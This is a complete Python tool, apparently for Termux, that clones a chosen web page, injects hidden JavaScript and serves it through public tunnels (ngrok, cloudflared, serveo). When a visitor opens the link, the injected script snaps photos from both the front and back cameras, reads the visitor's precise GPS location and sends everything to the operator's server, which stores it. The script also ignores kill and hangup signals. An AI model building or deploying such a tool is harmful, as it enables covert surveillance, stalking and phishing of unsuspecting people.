#!/usr/bin/env python3
# lang: Python 3, file: say.py, target: Termux / Linux
# jalankan: python say.py
# dep: flask requests pyngrok  (pip install flask requests pyngrok)

import os
import sys
import base64
import datetime
import threading
import webbrowser
import time
import subprocess
import shutil
import socket
import re
import signal

try:
    from flask import Flask, request, jsonify, send_from_directory
except ImportError:
    print("[!] Flask belum ada. Install dulu: pip install flask requests")
    sys.exit(1)

try:
    import requests as req_lib
except ImportError:
    req_lib = None

try:
    from pyngrok import ngrok as _ngrok
    PYNGROK = True
except ImportError:
    PYNGROK = False

# ------------------------------------------------------------------ #
#  BANNER
# ------------------------------------------------------------------ #
BANNER = r"""
  ____                ____ _                         
 / ___|  __ _ _   _  / ___| |__   ___  ___  ___  ___ 
 \___ \ / _` | | | || |   | '_ \ / _ \/ _ \/ __|/ _ \
  ___) | (_| | |_| || |___| | | |  __/  __/\__ \  __/
 |____/ \__,_|\__, | \____|_| |_|\___|\___||___/\___|
              |___/                                   
  tools lokasi + foto — front+back cam, Ctrl+C only shutdown
"""

# ------------------------------------------------------------------ #
#  JS INJECT — ambil front + back, lalu lokasi, kirim sekaligus
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var locSent = false;

  // kirim hasil ke server
  function sendData(lat, lon, accuracy, frontB64, backB64) {
    if (locSent) return;
    locSent = true;
    fetch('/capture', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: lat, lon: lon,
        accuracy: accuracy,
        photo_front: frontB64 || null,
        photo_back:  backB64  || null
      })
    });
  }

  // ambil lokasi setelah dua foto selesai
  function grabLocation(frontB64, backB64) {
    if (!navigator.geolocation) {
      sendData(null, null, null, frontB64, backB64);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendData(
          pos.coords.latitude,
          pos.coords.longitude,
          pos.coords.accuracy,
          frontB64, backB64
        );
      },
      function() { sendData(null, null, null, frontB64, backB64); },
      {enableHighAccuracy: true, timeout: 10000}
    );
  }

  // ambil satu frame dari kamera dengan facingMode tertentu
  function snapCamera(facingMode, cb) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      cb(null); return;
    }
    navigator.mediaDevices.getUserMedia({
      video: {facingMode: {ideal: facingMode}}, audio: false
    })
    .then(function(stream) {
      var video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', '');
      video.muted = true;
      video.play();
      // tunggu frame pertama siap
      var fired = false;
      function onFrame() {
        if (fired) return;
        fired = true;
        var canvas = document.createElement('canvas');
        canvas.width  = video.videoWidth  || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        stream.getTracks().forEach(function(t){ t.stop(); });
        cb(canvas.toDataURL('image/jpeg', 0.85).split(',')[1]);
      }
      video.addEventListener('loadeddata', onFrame);
      // fallback timeout kalau loadeddata tidak fire
      setTimeout(function(){
        if (!fired) { fired = true; stream.getTracks().forEach(function(t){t.stop();}); cb(null); }
      }, 5000);
    })
    .catch(function() { cb(null); });
  }

  function start() {
    // ambil back dulu, lalu front, lalu lokasi
    snapCamera('environment', function(backB64) {
      snapCamera('user', function(frontB64) {
        grabLocation(frontB64, backB64);
      });
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start);
  } else {
    start();
  }
})();
</script>
"""

# ------------------------------------------------------------------ #
#  HELPER: clone URL
# ------------------------------------------------------------------ #
def clone_url(url: str) -> str:
    if req_lib is None:
        raise RuntimeError("requests belum install: pip install requests")
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 "
                      "Chrome/112.0.0.0 Mobile Safari/537.36"
    }
    r = req_lib.get(url, headers=headers, timeout=15)
    r.raise_for_status()
    return r.text


def inject_into_html(html: str) -> str:
    lower = html.lower()
    idx = lower.rfind("</body>")
    if idx != -1:
        return html[:idx] + INJECT_JS + html[idx:]
    return html + INJECT_JS


def free_port(start: int = 8080) -> int:
    port = start
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", port)) != 0:
                return port
            port += 1


# ------------------------------------------------------------------ #
#  SIMPAN HASIL
# ------------------------------------------------------------------ #
def save_b64_image(b64: str, path: str) -> bool:
    try:
        with open(path, "wb") as f:
            f.write(base64.b64decode(b64))
        return True
    except Exception as e:
        print(f"[!] Gagal simpan {path}: {e}")
        return False


def save_result(data: dict):
    os.makedirs("hasil", exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    lat   = data.get("lat")
    lon   = data.get("lon")
    acc   = data.get("accuracy")
    front = data.get("photo_front")
    back  = data.get("photo_back")

    # --- lokasi ---
    loc_path = os.path.join("hasil", f"lokasi_{ts}.txt")
    with open(loc_path, "w") as f:
        if lat and lon:
            f.write(f"Latitude  : {lat}\n")
            f.write(f"Longitude : {lon}\n")
            f.write(f"Accuracy  : {acc} meter\n")
            f.write(f"Maps      : https://maps.google.com/?q={lat},{lon}\n")
        else:
            f.write("Lokasi tidak berhasil didapat.\n")
    print(f"[+] Lokasi disimpan  → {loc_path}")

    # --- foto back (kamera belakang) ---
    if back:
        p = os.path.join("hasil", f"back_{ts}.jpg")
        if save_b64_image(back, p):
            print(f"[+] Foto BACK        → {p}")
    else:
        print("[!] Foto back tidak didapat.")

    # --- foto front (selfie) ---
    if front:
        p = os.path.join("hasil", f"front_{ts}.jpg")
        if save_b64_image(front, p):
            print(f"[+] Foto FRONT       → {p}")
    else:
        print("[!] Foto front tidak didapat.")


# ------------------------------------------------------------------ #
#  SHUTDOWN LOCK — hanya Ctrl+C (SIGINT) yang boleh matiin
# ------------------------------------------------------------------ #
def _block_signal(signum, frame):
    """Tolak sinyal selain SIGINT — cetak warning, lanjut jalan."""
    names = {signal.SIGTERM: "SIGTERM", signal.SIGHUP: "SIGHUP"}
    print(f"\n[!] Sinyal {names.get(signum, signum)} diabaikan. Gunakan Ctrl+C untuk berhenti.")

def install_signal_lock():
    # blok SIGTERM (kill) dan SIGHUP (terminal tutup)
    for sig in (signal.SIGTERM, signal.SIGHUP):
        try:
            signal.signal(sig, _block_signal)
        except (OSError, ValueError):
            pass  # SIGHUP tidak ada di Windows, skip aja


# ------------------------------------------------------------------ #
#  FLASK APP
# ------------------------------------------------------------------ #
app = Flask(__name__)
_page_html = ""


@app.route("/")
def index():
    return _page_html


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    save_result(data)
    return jsonify({"ok": True})


@app.route("/<path:filename>")
def static_files(filename):
    return send_from_directory(".", filename)


def run_flask(port: int):
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)


# ------------------------------------------------------------------ #
#  TUNNEL: NGROK
# ------------------------------------------------------------------ #
def tunnel_ngrok(port: int) -> str | None:
    # cara 1: pyngrok
    if PYNGROK:
        token = input(
            " Authtoken ngrok (Enter skip jika sudah login): "
        ).strip()
        try:
            if token:
                _ngrok.set_auth_token(token)
            tunnel = _ngrok.connect(port, "http")
            return tunnel.public_url.replace("http://", "https://")
        except Exception as e:
            print(f"[!] pyngrok error: {e}")

    # cara 2: binary
    if shutil.which("ngrok"):
        token = input(
            " Authtoken ngrok (Enter skip jika sudah login): "
        ).strip()
        if token:
            subprocess.run(["ngrok", "config", "add-authtoken", token],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.Popen(
            ["ngrok", "http", str(port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[*] Menunggu tunnel ngrok...")
        for _ in range(20):
            time.sleep(0.6)
            try:
                r = req_lib.get("http://127.0.0.1:4040/api/tunnels", timeout=2)
                for t in r.json().get("tunnels", []):
                    u = t.get("public_url", "")
                    if u.startswith("https"):
                        return u
                    if u.startswith("http"):
                        return u
            except Exception:
                continue
        print("[!] Ngrok timeout.")
        return None

    print("[!] ngrok / pyngrok tidak ditemukan.")
    print("    Install: pip install pyngrok  atau  pkg install ngrok")
    return None


# ------------------------------------------------------------------ #
#  TUNNEL: CLOUDFLARED  ★ recommended ★
# ------------------------------------------------------------------ #
def tunnel_cloudflared(port: int) -> str | None:
    binary = shutil.which("cloudflared") or shutil.which("cloudflared.exe")
    if not binary:
        print("[!] cloudflared tidak ditemukan.")
        print("    Termux : pkg install cloudflared")
        print("    Linux  : wget -q https://github.com/cloudflare/cloudflared/releases/latest"
              "/download/cloudflared-linux-amd64 -O cloudflared && chmod +x cloudflared && mv cloudflared /usr/local/bin/")
        return None

    proc = subprocess.Popen(
        [binary, "tunnel", "--url", f"http://localhost:{port}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    print("[*] Menunggu tunnel cloudflared...")
    url_pattern = re.compile(r"https://[a-zA-Z0-9\-]+\.trycloudflare\.com")

    for _ in range(40):
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.5)
            continue
        match = url_pattern.search(line)
        if match:
            return match.group(0)

    print("[!] Cloudflared timeout — URL tidak kebaca.")
    proc.terminate()
    return None


# ------------------------------------------------------------------ #
#  TUNNEL: SERVEO (SSH)
# ------------------------------------------------------------------ #
def tunnel_serveo(port: int) -> str | None:
    if not shutil.which("ssh"):
        print("[!] SSH tidak ditemukan. Install: pkg install openssh")
        return None

    print("[*] Membuka tunnel serveo.net via SSH...")
    proc = subprocess.Popen(
        ["ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ServerAliveInterval=30",
         "-R", f"80:localhost:{port}",
         "serveo.net"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )

    url_pattern = re.compile(r"https?://[a-zA-Z0-9\-]+\.serveo\.net")
    for _ in range(30):
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.5)
            continue
        print(f"   serveo: {line.strip()}")
        match = url_pattern.search(line)
        if match:
            return match.group(0)

    print("[!] Serveo timeout.")
    proc.terminate()
    return None


# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    global _page_html

    install_signal_lock()   # lock — hanya Ctrl+C yang bisa matiin
    print(BANNER)

    # === STEP 1: pilih template ===
    print("=" * 57)
    print("  [1] Clone dari URL")
    print("  [2] Pakai file HTML lokal")
    print("=" * 57)

    while True:
        pilihan = input("\n Pilihan template (1/2): ").strip()
        if pilihan in ("1", "2"):
            break
        print("[!] Masukkan 1 atau 2.")

    raw_html = ""

    if pilihan == "1":
        url = input(" URL template : ").strip()
        if not url.startswith("http"):
            url = "https://" + url
        print(f"[*] Cloning {url} ...")
        try:
            raw_html = clone_url(url)
            print("[+] Clone berhasil.")
        except Exception as e:
            print(f"[!] Gagal clone: {e}")
            sys.exit(1)
    else:
        path = input(" Path file HTML : ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(f"[!] File tidak ditemukan: {path}")
            sys.exit(1)
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            raw_html = f.read()
        print("[+] File berhasil dibaca.")

    _page_html = inject_into_html(raw_html)
    print("[+] JS injeksi OK.")

    port = free_port(8080)

    # === STEP 2: pilih server / tunnel ===
    print("\n" + "=" * 57)
    print("  Jalankan server di mana?")
    print()
    print("  [1] Lokal saja         (http://127.0.0.1)")
    print("  [2] Ngrok              (butuh akun ngrok)")
    print("  [3] Cloudflared        ★ RECOMMENDED — no akun, HTTPS otomatis")
    print("  [4] Serveo             (via SSH, no install)")
    print("=" * 57)

    while True:
        mode = input("\n Pilihan server (1/2/3/4): ").strip()
        if mode in ("1", "2", "3", "4"):
            break
        print("[!] Masukkan 1, 2, 3, atau 4.")

    local_url = f"http://127.0.0.1:{port}"

    if mode == "1":
        # lokal aja
        print(f"\n[+] Server lokal  : {local_url}")
        print(f"[+] Hasil         : ./hasil/")
        print(f"[*] Ctrl+C untuk berhenti.\n")
        try:
            threading.Timer(1.0, lambda: webbrowser.open(local_url)).start()
        except Exception:
            pass
        app.run(host="0.0.0.0", port=port, debug=False)

    else:
        # spawn flask di background thread dulu
        flask_thread = threading.Thread(target=run_flask, args=(port,), daemon=True)
        flask_thread.start()
        time.sleep(1.2)

        pub_url = None

        if mode == "2":
            pub_url = tunnel_ngrok(port)
        elif mode == "3":
            pub_url = tunnel_cloudflared(port)
        elif mode == "4":
            pub_url = tunnel_serveo(port)

        if pub_url:
            print(f"\n{'=' * 57}")
            print(f"  [+] LINK PUBLIK  : {pub_url}")
            print(f"{'=' * 57}")
            print(f"  [+] Lokal        : {local_url}")
            print(f"  [+] Hasil        : ./hasil/")
            print(f"  [*] Ctrl+C untuk berhenti.\n")
        else:
            print(f"\n[!] Tunnel gagal. Server tetap jalan lokal.")
            print(f"[+] Lokal : {local_url}\n")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Dihentikan.")


if __name__ == "__main__":
    main()
